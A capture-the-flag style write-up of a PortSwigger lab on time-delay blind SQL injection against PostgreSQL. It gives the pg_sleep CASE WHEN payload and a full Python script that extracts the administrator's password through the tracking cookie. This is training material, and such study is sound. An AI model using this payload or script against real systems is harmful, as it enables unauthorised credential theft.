+++
date = '2026-07-16T14:02:16+08:00'
draft = false
title = "Blind SQL injection with time delays and information retrieval | <span style=\"color:#3498db\">Practitioner</span>"
tags = ['training', 'PortSwigger', 'writeups', 'web-exploitation']
description = ''
showLastUpdated = true
+++

Similar to [this lab](/training/portswigger/sqli/sqli_practitioner7), an SQLi vulnerability exists within `trackingId`. But the results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. 

But the problem statement does mention that it's possible to trigger time delays (duh), we are going to do just that. Let's start by finding out which database type we are dealing with first, and after some trials and errors we should be able to determine that this is a **PostgreSQL** database - evident by the `pg_sleep()` syntax:
![](/images/viber_image_2026-07-16_13-46-48-016.png)

After fingerprinting the type, we can start bruteforcing the password of `administrator` with this query:
```sql
SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(password, 1, 1) > 'a') = 1) THEN pg_sleep(3) ELSE pg_sleep(0) END
```
Keep in mind there's no `IF` in PostgreSQL, you'll have to use `SELECT CASE WHEN (...)`. I decided to wait for three seconds upon correct comparison rather than 10 (way too overkill). But remember to take network latency into account, I was able to pick three because I have fairly strong Internet connection, but for those with weaker connection I'd say 10 just to be safe.

With that in mind, we can execute the following Python script to bruteforce the password:
```python
import requests

url= "https://<lab-id>.web-security-academy.net/filter?category=Gifts"
cookie_string = "TrackingId=<id>'%3b SELECT CASE WHEN ((SELECT COUNT(username) FROM users WHERE username='administrator' AND SUBSTRING(password, 1, {current_length}) > '{current_password}') = 1) THEN pg_sleep(3) ELSE pg_sleep(0) END--; session=<cookie>"
password = ""
password_length = 20

wordlist = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 
            'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 
            'w', 'x', 'y', 'z']

for current_length in range(1, password_length + 1):
    response = ""
    l, r = 0, len(wordlist) - 1
    
    # Binary search each character
    while l < r:
        mid = (l + r) // 2
        
        headers = {
            "Cookie": cookie_string.format(current_length=current_length, current_password=password + wordlist[mid])
        }
        
        response = requests.get(url, headers=headers)
        
        # Current character has ASCII value lower than or equal to wordlist[mid]
        if response.elapsed.total_seconds() < 3:
            r = mid
        # Current character has ASCII value higher than wordlist[mid]
        else:
            l = mid + 1
            
    password += wordlist[l]
    print(password)
```
![](/images/viber_image_2026-07-16_14-10-29-172.png)